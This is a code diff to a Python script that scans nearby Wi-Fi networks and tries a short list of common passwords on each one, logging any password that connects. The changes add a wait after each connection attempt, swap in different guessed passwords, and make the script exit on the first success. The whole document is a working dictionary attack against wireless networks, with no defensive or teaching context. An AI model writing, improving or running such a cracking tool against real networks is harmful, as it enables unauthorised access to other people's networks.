@@ -45,6 +45,7 @@ class MyWifi:
         tmp_profile = self.ifaces.add_network_profile(profile)  # 加载配置文件
 
         self.ifaces.connect(tmp_profile)  # 连接
+        time.sleep(5)
         if self.ifaces.status() == const.IFACE_CONNECTED:
             logger.info(f"wifi【{wifi_name}】的密码是{password}")
             self.ifaces.disconnect()  # 断开连接
@@ -55,7 +56,7 @@ class MyWifi:
 
 
 if __name__ == '__main__':
-    passwords = ["12345678", "88888888", "123456789"]
+    passwords = ["123456789", "66666666", "1234567890"]
 
     m = MyWifi()
     for name in m.get_wifi_name():
@@ -64,8 +65,8 @@ if __name__ == '__main__':
         for pw in passwords:
             try:
                 if m.conn_wifi(name, pw):
-                    print("success get password {}")
-                    break
+                    print("success get password")
+                    exit(0)
             except Exception as e:
                 print(e)
     print("done")
